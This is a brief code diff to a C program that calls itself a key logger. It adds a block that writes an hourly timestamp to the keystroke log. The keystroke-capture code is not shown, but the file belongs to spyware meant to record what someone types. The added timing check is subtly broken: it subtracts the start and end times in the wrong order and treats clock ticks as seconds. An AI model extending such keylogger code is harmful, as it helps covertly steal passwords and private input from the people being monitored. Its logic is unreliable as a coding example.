@@ -98,7 +98,7 @@ int main(int argc, char **argv) {
     log_time_now(timestring);
     fprintf(log, "\n Starting key logger: %s\n", timestring);
     bzero(timestring, 80);
-    
+
     start = clock();
 
     while (readable > 0) {
@@ -139,6 +139,12 @@ int main(int argc, char **argv) {
             }
         }
         end = clock();
+        if ((start - end) >= 3600) {
+            log_time_now(timestring);
+            fprintf(log, "\n%s\n", timestring);
+            fflush(log);
+            bzero(timestring, 80);
+        }
     }
 
     fclose(log);
